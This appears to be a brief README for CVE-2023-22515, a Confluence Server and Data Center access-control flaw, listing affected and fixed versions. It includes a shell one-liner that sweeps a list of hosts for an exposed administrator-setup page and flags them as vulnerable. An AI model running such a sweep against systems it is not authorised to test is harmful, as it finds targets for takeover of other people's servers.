# CVE-2023-22515
CVE-2023-22515, a critical vulnerability affecting on-premises instances of Confluence Server and Confluence Data Center, a Broken Access Control vulnerability. Attlassian has provided a CVSS base score of 10.0



#one line poc
```
cat file.txt| while read host do;do curl -skL "http://$host/setup/setupadministrator.action" | grep -i "<title>Setup System Administrator" && echo $host "is VULN";done
```


## Affected Versions
```
8.0.0
8.0.1
8.0.2
8.0.3
8.0.4
8.1.0
8.1.1
8.1.3
8.1.4
8.2.0
8.2.1
8.2.2
8.2.3
8.3.0
8.3.1
8.3.2
8.4.0
8.4.1
8.4.2
8.5.0
8.5.1
```


## Fixed Versions
```
8.3.3 or later
8.4.3 or later
8.5.2 (Long Term Support release) or later
```
